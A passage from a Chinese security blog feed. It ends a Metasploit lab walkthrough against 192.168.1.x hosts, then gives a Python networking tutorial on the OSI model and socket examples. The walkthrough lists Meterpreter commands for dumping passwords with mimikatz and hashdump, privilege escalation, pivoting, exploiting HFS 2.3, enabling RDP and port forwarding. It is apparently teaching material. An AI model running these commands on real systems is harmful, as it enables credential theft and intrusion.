src="/aisnnu.github.io/uncategorized/aisnnu3/15.png" alt=""></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>我们可以进一步收集Web 服务器192.168.1.100 的相关信息。</p><h3 id="权限查看"><a href="#权限查看" class="headerlink" title="权限查看"></a>权限查看</h3><p> <code>getuid</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/16.png" alt=""></p><h3 id="系统信息"><a href="#系统信息" class="headerlink" title="系统信息"></a>系统信息</h3><p><code>systinfo</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/17.png" alt=""></p><h3 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h3><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/18.png" alt=""></p><h3 id="是否虚拟机"><a href="#是否虚拟机" class="headerlink" title="是否虚拟机"></a>是否虚拟机</h3><p><code>run post/windows/gather/checkvm</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/19.png" alt=""></p><h3 id="补丁信息"><a href="#补丁信息" class="headerlink" title="补丁信息"></a>补丁信息</h3><p><code>run post/windows/gather/enum_patches</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/20.png" alt=""></p><p>信息搜集的脚本比较多，以下列出几个。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain #查找域控</span><br></pre></td></tr></table></figure></p><h3 id="抓取明文密码"><a href="#抓取明文密码" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h3><p>导入神器load mimikatz</p><p>导出密码 <code>kerberos</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/21.png" alt=""></p><p>我们可以导出目标服务器的用户名和密码<code>Administrator/http://123.com</code></p><h3 id="远程桌面与截屏"><a href="#远程桌面与截屏" class="headerlink" title="远程桌面与截屏"></a>远程桌面与截屏</h3><p><code>run vnc</code></p><p>直接登录目标服务器。</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/22.png" alt=""></p><p>还有很多命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops #查看可用的桌面</span><br><span class="line">getdesktop #获取当前meterpreter 关联的桌面</span><br><span class="line">set_desktop #设置meterpreter关联的桌面 -h查看帮助</span><br><span class="line">screenshot #截屏</span><br><span class="line">use espia #或者使用espia模块截屏 然后输入screengrab</span><br><span class="line">run vnc #使用vnc远程桌面连接</span><br></pre></td></tr></table></figure><p>到此为止，这台服务器已经完全在我们的掌控之中。</p><h2 id="扩大战果"><a href="#扩大战果" class="headerlink" title="扩大战果"></a>扩大战果</h2><h3 id="查看arp-缓存"><a href="#查看arp-缓存" class="headerlink" title="查看arp 缓存"></a>查看arp 缓存</h3><p> <code>arp</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/23.png" alt=""></p><h3 id="查看路由信息"><a href="#查看路由信息" class="headerlink" title="查看路由信息"></a>查看路由信息</h3><p><code>route</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/24.png" alt=""></p><h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><p><code>run autoroute -s 192.168.1.0/24</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/25.png" alt=""></p><h3 id="查看添加的路由信息"><a href="#查看添加的路由信息" class="headerlink" title="查看添加的路由信息"></a>查看添加的路由信息</h3><p><code>run autoroute -p</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/26.png" alt=""></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>发现目标开启了80 端口</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/27.png" alt=""></p><h3 id="版本信息测探"><a href="#版本信息测探" class="headerlink" title="版本信息测探"></a>版本信息测探</h3><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/28.png" alt=""></p><h2 id="再次渗透攻击"><a href="#再次渗透攻击" class="headerlink" title="再次渗透攻击"></a>再次渗透攻击</h2><p>我们发现[192.168.1.200] 这台机器上80 端口运行着HFS 服务。这个[HFS 2.3 beta]版本存在远程代码执行漏洞。我们可以再次发起渗透攻击。</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/29.png" alt=""></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/30.png" alt=""></p><h3 id="切入会话-5"><a href="#切入会话-5" class="headerlink" title="切入会话 5"></a>切入会话 5</h3><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/31.png" alt=""></p><p>查看权限</p><p><code>getuid</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/32.png" alt=""></p><p>尝试提权</p><p><code>getsystem</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/33.png" alt=""></p><p>进程迁移</p><p><code>migrate 12</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/34.png" alt=""></p><p>尝试导出账户hash值</p><p><code>run hashdump</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/35.png" alt=""></p><h3 id="查看IP-信息"><a href="#查看IP-信息" class="headerlink" title="查看IP 信息"></a>查看IP 信息</h3><p>关键信息如下</p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/36.png" alt=""></p><h3 id="开启远程桌面连接"><a href="#开启远程桌面连接" class="headerlink" title="开启远程桌面连接"></a>开启远程桌面连接</h3><p><code>run post/windows/manage/enable_rdp</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/37.png" alt=""></p><h3 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h3><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/38.png" alt=""></p><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><code>portfwd add -l 33891 -p 3389 -r 127.0.0.1</code></p><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/39.png" alt=""></p><h3 id="远程桌面登录"><a href="#远程桌面登录" class="headerlink" title="远程桌面登录"></a>远程桌面登录</h3><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/40.png" alt=""></p><h3 id="登录成功"><a href="#登录成功" class="headerlink" title="登录成功"></a>登录成功</h3><p><img src="/aisnnu.github.io/uncategorized/aisnnu3/41.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python网络编程</title>
      <link href="/aisnnu.github.io/uncategorized/aisnnu2/"/>
      <url>/aisnnu.github.io/uncategorized/aisnnu2/</url>
      
        <content type="html"><![CDATA[<p>pyton语言在网络编程中的应用比较广泛。socket模块可以实现网络设备之间的通信；HTTP库可以实现网站服务器与浏览器之前的通信；urllib库可以处理客户端的请求和服务器端的响应，还可以解析URL地址；ftplib模块可以实现文件的上传和下载；电子邮件服务器模块可以实现邮件的发送和接收；telnetlib模块可以连接远程计算机。</p><a id="more"></a><h1 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h1><p>OSI是Open System Interconnection的缩写，意为开放式系统互联。国际标准化组织（ISO）制定了OSI模型，该模型定义了不同计算机互联的标准，是设计和描述计算机网络通信的基本框架。OSI模型把网络通信的工作分为7层，分别是物理层、数据链路层、网络层、传输层、会话层、表示层和应用层。<br>OSI模型的设计目的是成为一个所有销售商都能实现的开放网路模型，来克服使用众多私有网络模型所带来的困难和低效性。OSI是在一个备受尊敬的国际标准团体的参与下完成的，这个组织就是ISO（国际标准化组织）。什么是OSI，OSI是Open System Interconnection 的缩写，意为开放式系统互联参考模型。在OSI出现之前，计算机网络中存在众多的体系结构，其中以IBM公司的SNA(Systems Network Architecture，系统网络体系结构)和DEC公司的DNA(Digital Network Architecture，数字网络体系结构)最为著名。为了解决不同体系结构的网络的互联问题，国际标准化组织ISO(注意不要与OSI搞混）于1981年制定了开放系统互连参考模型（Open System Interconnection Reference Model，OSI/RM）。这个模型把网络通信的工作分为7层，它们由低到高分别是物理层（Physical Layer)，数据链路层（Data Link Layer)，网络层(Network Layer)，传输层（Transport Layer)，会话层（Session Layer），表示层（Presentation Layer)和应用层（Application Layer)。第一层到第三层属于OSI参考模型的低三层，负责创建网络通信连接的链路；第五层到第七层为OSI参考模型的高三层，具体负责端到端的数据通信；第四层负责高低层的连接。每层完成一定的功能，每层都直接为其上层提供服务，并且所有层次都互相支持，而网络通信则可以自上而下（在发送端）或者自下而上（在接收端）双向进行。当然并不是每一通信都需要经过OSI的全部七层，有的甚至只需要双方对应的某一层即可。物理接口之间的转接，以及中继器与中继器之间的连接就只需在物理层中进行即可；而路由器与路由器之间的连接则只需经过网络层以下的三层即可。总的来说，双方的通信是在对等层次上进行的，不能在不对称层次上进行通信。</p><h2 id="OSI分层原则"><a href="#OSI分层原则" class="headerlink" title="OSI分层原则"></a>OSI分层原则</h2><p>网络中各结点都有相同的层次</p><p>不同结点相同层次具有相同的功能</p><p>同一结点相邻层间通过接口通信</p><p>每一层可以使用下层提供的服务，并向上层提供服务</p><p>不同结点的同等层间通过协议来实现对等层间的通信</p><h2 id="OSIOSI-RM分层"><a href="#OSIOSI-RM分层" class="headerlink" title="OSIOSI/RM分层"></a>OSIOSI/RM分层</h2><p>对等层通信的实质：</p><p>对等层实体之间虚拟通信；下层向上层提供服务；实际通信在最底层完成；发送方数据由最高层逐渐向下层传递，到接收方数据由最低层逐渐向高层传递。</p><h2 id="协议数据单元PDU"><a href="#协议数据单元PDU" class="headerlink" title="协议数据单元PDU"></a>协议数据单元PDU</h2><p>OSI参考模型中，对等层协议之间交换的信息单元统称为协议数据单元(PDU，Protocol Data Unit)。</p><p>而传输层及以下各层的PDU另外还有各自特定的名称：</p><p>传输层——数据段（Segment）</p><p>网络层——分组（数据包）（Packet）</p><p>数据链路层——数据帧（Frame）</p><p>物理层——比特（Bit）</p><h2 id="物理层（Physical-Layer）"><a href="#物理层（Physical-Layer）" class="headerlink" title="物理层（Physical Layer）"></a>物理层（Physical Layer）</h2><p>物理层是OSI分层结构体系中最重要、最基础的一层，它建立在传输媒介基础上，起建立、维护和取消物理连接作用，实现设备之间的物理接口。物理层之接收和发送一串比特(bit)流，不考虑信息的意义和信息结构。</p><p>物理层包括对连接到网络上的设备描述其各种机械的、电气的、功能的规定。具体地讲，机械特性规定了网络连接时所需接插件的规格尺寸、引脚数量和排列情况等；电气特性规定了在物理连接上传输bit流时线路上信号电平的大小、阻抗匹配、传输速率距离限制等；功能特性是指对各个信号先分配确切的信号含义，即定义了DTE（数据终端设备）和DCE（数据通信设备）之间各个线路的功能；过程特性定义了利用信号线进行bit流传输的一组操作规程，是指在物理连接的建立、维护、交换信息时，DTE和DCE双方在各电路上的动作系列。物理层的数据单位是位。</p><p>属于物理层定义的典型规范代表包括：EIA/TIARS-232、EIA/TIARS-449、V.35、RJ-45等。</p><h3 id="物理层的主要功能："><a href="#物理层的主要功能：" class="headerlink" title="物理层的主要功能："></a>物理层的主要功能：</h3><p>·为数据端设备提供传送数据的通路，数据通路可以是一个物理媒体，也可以是多个物理媒体连接而成。一次完整的数据传输，包括激活物理连接，传送数据，终止物理连接。所谓激活，就是不管有多少物理媒体参与，都要在通信的两个数据终端设备间连接起来，形成一条通路。</p><p>·传输数据。物理层要形成适合数据传输需要的实体，为数据传送服务：</p><p>一、保证数据按位传输的正确性；</p><p>二、向数据链路层提供一个透明的位传输；</p><p>三、提供足够的带宽(带宽是指每秒钟内能通过的比特(BIT)数)，以减少信道上的拥塞。传输数据的方式能满足点到点，一点到多点，串行或并行，半双工或全双工，同步或异步传输的需要。</p><p>完成物理层的一些管理工作，如在数据终端设备、数据通信和交换设备等设备之间完成对数据链路的建立、保持和拆除操作。</p><p>物理层的典型设备：光纤、同轴电缆、双绞线、中继器和集线器</p><h2 id="数据链路层（Data-Link-Layer）"><a href="#数据链路层（Data-Link-Layer）" class="headerlink" title="数据链路层（Data Link Layer）"></a>数据链路层（Data Link Layer）</h2><p>在物理层提供比特流服务的基础上，将比特信息封装成数据帧Frame，起到在物理层上建立、撤销、标识逻辑链接和链路复用以及差错校验等功能。通过使用接收系统的硬件地址或物理地址来寻址。建立相邻结点之间的数据链路，通过差错控制提供数据帧（Frame）在信道上无差错的传输，同时为其上面的网络层提供有效的服务。</p><p>数据链路层在不可靠的物理介质上提供可靠的传输。该层的作用包括：物理地址寻址、数据的成帧、流量控制、数据的检错、重发等。</p><p>在这一层，数据的单位称为帧（frame）。</p><p>数据链路层协议的代表包括：SDLC、HDLC、PPP、STP、帧中继等。</p><h3 id="链路层的主要功能："><a href="#链路层的主要功能：" class="headerlink" title="链路层的主要功能："></a>链路层的主要功能：</h3><p>·链路层的功能是实现系统实体间二进制信息块的正确传输</p><p>·为网络层提供可靠无错误的数据信息</p><p>·在数据链路中解决信息模式、操作模式、差错控制、流量控制、信息交换过程和通信控制规程的问题</p><p>链路层是为网络层提供数据传送服务的，这种服务要依靠本层具备的功能来实现。链路层应具备如下功能：</p><p>·链路连接的建立，拆除，分离。</p><p>·帧定界和帧同步。链路层的数据传输单元是帧，协议不同，帧的长短和界面也有差别，但无论如何必须对帧进行定界。</p><p>·顺序控制，指对帧的收发顺序的控制。</p><p>·差错检测和恢复。还有链路标识，流量控制等等。差错检测多用方阵码校验和循环码校验来检测信道上数据的误码，而帧丢失等用序号检测。各种错误的恢复则常靠反馈重发技术来完成。</p><p>数据链路层的典型设备：二层交换机、网桥、网卡</p><h2 id="网络层（Network-Layer）"><a href="#网络层（Network-Layer）" class="headerlink" title="网络层（Network Layer）"></a>网络层（Network Layer）</h2><p>网络层也称通信子网层，是高层协议之间的界面层，用于控制通信子网的操作，是通信子网与资源子网的接口。在计算机网络中进行通信的两个计算机之间可能会经过很多个数据链路，也可能还要经过很多通信子网。网络层的任务就是选择合适的网间路由和交换结点，确保数据及时传送。网络层将解封装数据链路层收到的帧，提取数据包，包中封装有网络层包头，其中含有逻辑地址信息源站点和目的站点地址的网络地址。</p><p>如果你在谈论一个IP地址，那么你是在处理第3层的问题，这是“数据包”问题，而不是第2层的“帧”。IP是第3层问题的一部分，此外还有一些路由协议和地址解析协议（ARP）。有关路由的一切事情都在第3层处理。地址解析和路由是3层的重要目的。网络层还可以实现拥塞控制、网际互连、信息包顺序控制及网络记账等功能。</p><p>在网络层交换的数据单元的单位是分割和重新组合数据包（packet）。</p><p>网络层协议的代表包括：IP、IPX、OSPF等。</p><p>网络层主要功能是基于网络层地址（IP地址）进行不同网络系统间的路径选择。</p><h3 id="网络层主要功能"><a href="#网络层主要功能" class="headerlink" title="网络层主要功能"></a>网络层主要功能</h3><p>网络层为建立网络连接和为上层提供服务，应具备以下主要功能：</p><p>·路由选择和中继；</p><p>·激活，终止网络连接；</p><p>·在一条数据链路上复用多条网络连接，多采取分时复用技术；</p><p>·差错检测与恢复；</p><p>·排序，流量控制；</p><p>·服务选择；</p><p>·网络管理；</p><p>网络层典型设备：网关、路由器</p><h2 id="传输层（Transport-Layer）"><a href="#传输层（Transport-Layer）" class="headerlink" title="传输层（Transport Layer）"></a>传输层（Transport Layer）</h2><p>传输层建立在网络层和会话层之间，实质上它是网络体系结构中高低层之间衔接的一个接口层。用一个寻址机制来标识一个特定的应用程序（端口号）。传输层不仅是一个单独的结构层，它还是整个分层体系协议的核心，没有传输层整个分层协议就没有意义。</p><p>传输层的数据单元是由数据组织成的数据段（segment）这个层负责获取全部信息，因此，它必须跟踪数据单元碎片、乱序到达的数据包和其它在传输过程中可能发生的危险。</p><p>传输层获得下层提供的服务包括：</p><p>·发送和接收正确的数据块分组序列，并用其构成传输层数据；</p><p>·获得网络层地址，包括虚拟信道和逻辑信道。</p><p>传输层向上层提供的服务包括：</p><p>·无差错的有序的报文收发；</p><p>·提供传输连接；</p><p>·进行流量控制。</p><p>传输层为上层提供端到端（最终用户到最终用户）的透明的、可靠的数据传输服务，所谓透明的传输是指在通信过程中传输层对上层屏蔽了通信传输系统的具体细节。</p><p>传输层协议的代表包括：TCP、UDP、SPX等。</p><h3 id="传输层主要功能"><a href="#传输层主要功能" class="headerlink" title="传输层主要功能"></a>传输层主要功能</h3><p>传输层的主要功能是从会话层接收数据，根据需要把数据切成较小的数据片，并把数据传送给网络层，确保数据片正确到达网络层，从而实现两层数据的透明传送。</p><p>传输层是两台计算机经过网络进行数据通信时，第一个端到端的层次，具有缓冲作用。当网络层服务质量不能满足要求时，它将服务加以提高，以满足高层的要求；当网络层服务质量较好时，它只用很少的工作。传输层还可进行复用，即在一个网络连接上创建多个逻辑连接。</p><p>传输层也称为运输层。传输层只存在于端开放系统中，是介于低三层通信子网系统和高三层之间的一层，但是很重要的一层。因为它是源端到目的端对数据传送进行控制从低到高的最后一层。</p><p>有一个既存事实，即世界上各种通信子网在性能上存在着很大差异。例如电话交换网、分组交换网、公用数据交换网、局域网等通信子网都可互连，但它们提供的吞吐量、传输速率、数据延迟通信费用各不相同。对于会话层来说，却要求有一性能恒定的界面。传输层就承担了这一功能。它采用分流/合流、复用/介复用技术来调节上述通信子网的差异，使会话层感受不到。</p><p>此外传输层还要具备差错恢复、流量控制等功能，以此对会话层屏蔽通信子网在这些方面的细节与差异。传输层面对的数据对象已不是网络地址和主机地址，而是和会话层的界面端口。上述功能的最终目的是为会话提供可靠的、无误的数据传输。传输层的服务一般要经历传输连接建立阶段、数据传送阶段、传输连接释放阶段3个阶段才算完成一个完整的服务过程。而在数据传送阶段又分为一般数据传送和加速数据传送两种。传输层服务分成5种类型。基本可以满足对传送质量、传送速度、传送费用的各种不同需要。</p><h2 id="会话层（Session-Layer）"><a href="#会话层（Session-Layer）" class="headerlink" title="会话层（Session Layer）"></a>会话层（Session Layer）</h2><p>这一层也可以称为会晤层或对话层，在会话层及以上的高层次中，数据传送的单位不再另外命名，统称为报文。会话层不参与具体的传输，它提供包括访问验证和会话管理在内的建立和维护应用之间通信的机制。如服务器验证用户登录便是由会话层完成的。</p><p>会话层提供的服务可使应用建立和维持会话，并能使会话获得同步。会话层使用校验点可使通信会话在通信失效时从校验点继续恢复通信。这种能力对于传送大的文件极为重要。会话层、表示层、应用层构成开放系统的高3层，面对应用进程提供分布处理，对话管理，信息表示，恢复最后的差错等。会话层同样要担负应用进程服务要求，而运输层不能完成的那部分工作，给运输层功能差距以弥补。主要的功能是对话管理，数据流同步和重新同步。要完成这些功能，需要由大量的服务单元功能组合，已经制定的功能单元已有几十种。</p><h3 id="会话层的主要功能"><a href="#会话层的主要功能" class="headerlink" title="会话层的主要功能"></a>会话层的主要功能</h3><p>·会话层连接到传输层的映射；</p><p>·会话连接的流量控制；</p><p>·数据传输；</p><p>·会话连接恢复与释放；</p><p>·会话连接管理、差错控制。</p><p>为会话实体间建立连接、为给两个对等会话服务用户建立一个会话连接，应该做如下几项工作：</p><p>·将会话地址映射为运输地址；</p><p>·选择需要的运输服务质量参数(QOS)；</p><p>·对会话参数进行协商；</p><p>·识别各个会话连接；</p><p>·传送有限的透明用户数据；</p><p>·数据传输阶段。</p><p>这个阶段是在两个会话用户之间实现有组织的，同步的数据传输。用户数据单元为SSDU，而协议数据单元为SPDU。会话用户之间的数据传送过程是将SSDU转变成SPDU进行的。</p><p>连接释放</p><p>连接释放是通过”有序释放”、”废弃”、”有限量透明用户数据传送”等功能单元来释放会话连接的。会话层标准为了使会话连接建立阶段能进行功能协商，也为了便于其它国际标准参考和引用，定义了12种功能单元。各个系统可根据自身情况和需要，以核心功能服务单元为基础，选配其他功能单元组成合理的会话服务子集。会话层的主要标准有”DIS8236:会话服务定义”和”DIS8237:会话协议规范”。</p><h2 id="表示层（Presentation-Layer）"><a href="#表示层（Presentation-Layer）" class="headerlink" title="表示层（Presentation Layer）"></a>表示层（Presentation Layer）</h2><p>表示层向上对应用层提供服务，向下接收来自会话层的服务。表示层是为在应用过程之间传送的信息提供表示方法的服务，它关心的只是发出信息的语法与语义。表示层要完成某些特定的功能，主要有不同数据编码格式的转换，提供数据压缩、解压缩服务，对数据进行加密、解密。例如图像格式的显示，就是由位于表示层的协议来支持。</p><p>表示层为应用层提供服务包括语法选择、语法转换等。语法选择是提供一种初始语法和以后修改这种选择的手段。语法转换涉及代码转换和字符集的转换、数据格式的修改以及对数据结构操作的适配。 </p><h2 id="应用层（Application-Layer）"><a href="#应用层（Application-Layer）" class="headerlink" title="应用层（Application Layer）"></a>应用层（Application Layer）</h2><p>网络应用层是通信用户之间的窗口，为用户提供网络管理、文件传输、事务处理等服务。其中包含了若干个独立的、用户通用的服务协议模块。网络应用层是OSI的最高层，为网络用户之间的通信提供专用的程序。应用层的内容主要取决于用户的各自需要，这一层设计的主要问题是分布数据库、分布计算技术、网络操作系统和分布操作系统、远程文件传输、电子邮件、终端电话及远程作业登录与控制等。至2011年应用层在国际上没有完整的标准，是一个范围很广的研究领域。在OSI的7个层次中，应用层是最复杂的，所包含的应用层协议也最多，有些还在研究和开发之中。</p><p>应用层为操作系统或网络应用程序提供访问网络服务的接口。</p><p>应用层协议的代表包括：Telnet、FTP、HTTP、SNMP、DNS等。</p><p>通过 OSI 层，信息可以从一台计算机的软件应用程序传输到另一台的应用程序上。例如，计算机 A 上的应用程序要将信息发送到计算机 B 的应用程序，则计算机 A 中的应用程序需要将信息先发送到其应用层（第七层），然后此层将信息发送到表示层（第六层），表示层将数据转送到会话层（第五层），如此继续，直至物理层（第一层）。在物理层，数据被放置在物理网络媒介中并被发送至计算机 B 。计算机 B 的物理层接收来自物理媒介的数据，然后将信息向上发送至数据链路层（第二层），数据链路层再转送给网络层，依次继续直到信息到达计算机 B 的应用层。最后，计算机 B 的应用层再将信息传送给应用程序接收端，从而完成通信过程。</p><p>OSI 的七层运用各种各样的控制信息来和其他计算机系统的对应层进行通信。这些控制信息包含特殊的请求和说明，它们在对应的 OSI 层间进行交换。每一层数据的头和尾是两个携带控制信息的基本形式。</p><p>对于从上一层传送下来的数据，附加在前面的控制信息称为头，附加在后面的控制信息称为尾。然而，在对来自上一层数据增加协议头和协议尾，对一个 OSI 层来说并不是必需的。</p><p>当数据在各层间传送时，每一层都可以在数据上增加头和尾，而这些数据已经包含了上一层增加的头和尾。协议头包含了有关层与层间的通信信息。头、尾以及数据是相关联的概念，它们取决于分析信息单元的协议层。例如，传输层头包含了只有传输层可以看到的信息，传输层下面的其他层只将此头作为数据的一部分传递。对于网络层，一个信息单元由第三层的头和数据组成。对于数据链路层，经网络层向下传递的所有信息即第三层头和数据都被看作是数据。换句话说，在给定的某一 OSI 层，信息单元的数据部分包含来自于所有上层的头和尾以及数据，这称之为封装。</p><p>例如，如果计算机 A 要将应用程序中的某数据发送至计算机 B ，数据首先传送至应用层。 计算机 A 的应用层通过在数据上添加协议头来和计算机 B 的应用层通信。所形成的信息单元包含协议头、数据、可能还有协议尾，被发送至表示层，表示层再添加为计算机 B 的表示层所理解的控制信息的协议头。信息单元的大小随着每一层协议头和协议尾的添加而增加，这些协议头和协议尾包含了计算机 B 的对应层要使用的控制信息。在物理层，整个信息单元通过网络介质传输。</p><p>计算机 B 中的物理层收到信息单元并将其传送至数据链路层；然后 B 中的数据链路层读取计算机 A 的数据链路层添加的协议头中的控制信息；然后去除协议头和协议尾，剩余部分被传送至网络层。每一层执行相同的动作：从对应层读取协议头和协议尾，并去除，再将剩余信息发送至上一层。应用层执行完这些动作后，数据就被传送至计算机 B 中的应用程序，这些数据和计算机 A 的应用程序所发送的完全相同 。</p><p>一个 OSI 层与另一层之间的通信是利用第二层提供的服务完成的。相邻层提供的服务帮助一 OSI 层与另一计算机系统的对应层进行通信。一个 OSI 模型的特定层通常是与另外三个 OSI 层联系：与之直接相邻的上一层和下一层，还有目标联网计算机系统的对应层。例如，计算机 A 的数据链路层应与其网络层，物理层以及计算机 B 的数据链路层进行通信。</p><p>网络的连接有两种类型：以连接为导向和以包为导向</p><h1 id="socket模块"><a href="#socket模块" class="headerlink" title="socket模块"></a>socket模块</h1><p>socket由一些对象组成，这些对象提供网络应用程序的跨平台标准。</p><h2 id="认识socket模块"><a href="#认识socket模块" class="headerlink" title="认识socket模块"></a>认识socket模块</h2><p>socket又称“套接字”，应用程序通常通过“套接字”向网络发出请求或应答网络请求，使主机间或一台计算机上的进程可以通信。socket模块提供了标准的网络接口，可以访问底层操作系统socket接口的全部方法。</p><p>Python使用socket()函数创建套接字，其语法格式如下：</p><p><code>socket.socket([family[, type[,protocol]]])</code></p><p>各个参数的含义如下：</p><p>（1）family：套接字中的网络协议，包括AF_UNTX(UNTX网域协议)或AF_INET(IPv4网域协议，如TCP与UDP)。<br>（2）type：套接字类型，包括SOCK_STREAM(使用在TCP协议)、SOCK_DGRAM(使用在UDP协议)、SOCK_RAW(使用在IP协议)和SOCK_SEQPACKET(列表连接模式)。<br>（3）protocol：只使用在family等于AF_INET或type等于SOCK_RAW的时候。protocol是一个常数，用于辨识所使用的协议种类。默认值是0，表示适用于所有的socket类型。</p><h2 id="创建socket连接"><a href="#创建socket连接" class="headerlink" title="创建socket连接"></a>创建socket连接</h2><p>下面使用socket模块的socket函数创建一个socket对象。socket对象可以通过调用其他函数设置一个socket服务。通过调用bind(hostname,port)函数指定服务的port(端口)，然后调用socket对象的accept方法，该方法等待客户端的连接并返回connection对象，表示已连接到该客户端。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#创建服务器端的socket服务</span><br><span class="line"># 导入 socket、sys 模块</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"># 创建 socket 对象</span><br><span class="line">serversocket = socket.socket(</span><br><span class="line">            socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line"></span><br><span class="line"># 获取本地主机名</span><br><span class="line">host = socket.gethostname()</span><br><span class="line"></span><br><span class="line">port = 9999</span><br><span class="line"></span><br><span class="line"># 绑定端口</span><br><span class="line">serversocket.bind((host, port))</span><br><span class="line"></span><br><span class="line"># 设置最大连接数，超过后排队</span><br><span class="line">serversocket.listen(5)</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    # 建立客户端连接</span><br><span class="line">    clientsocket,addr = serversocket.accept()      </span><br><span class="line"></span><br><span class="line">    print(&quot;连接地址: %s&quot; % str(addr))</span><br><span class="line">    </span><br><span class="line">    msg=&apos;莫使金樽空对月，还须怜取眼前人&apos;+ &quot;\r\n&quot;</span><br><span class="line">    clientsocket.send(msg.encode(&apos;utf-8&apos;))</span><br><span class="line">    clientsocket.close()</span><br></pre></td></tr></table></figure><p>保存并运行程序，即可在服务器端启动socket服务。</p><p>下面演示如何创建一个客户端，并连接到以上服务，端口号为12345。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#创建客户端的连接</span><br><span class="line"></span><br><span class="line"># 导入 socket、sys 模块</span><br><span class="line">import socket</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"># 创建 socket 对象</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) </span><br><span class="line"></span><br><span class="line"># 获取本地主机名</span><br><span class="line">host = socket.gethostname() </span><br><span class="line"></span><br><span class="line"># 设置端口号</span><br><span class="line">port = 9999</span><br><span class="line"></span><br><span class="line"># 连接服务，指定主机和端口</span><br><span class="line">s.connect((host, port))</span><br><span class="line"></span><br><span class="line"># 接收小于 1024 字节的数据</span><br><span class="line">msg = s.recv(1024)</span><br><span class="line"></span><br><span class="line">s.close()</span><br><span class="line"></span><br><span class="line">print (msg.decode(&apos;utf-8&apos;))</span><br></pre></td></tr></table></figure><p>保存并运行程序。</p><h1 id="HTTP库"><a href="#HTTP库" class="headerlink" 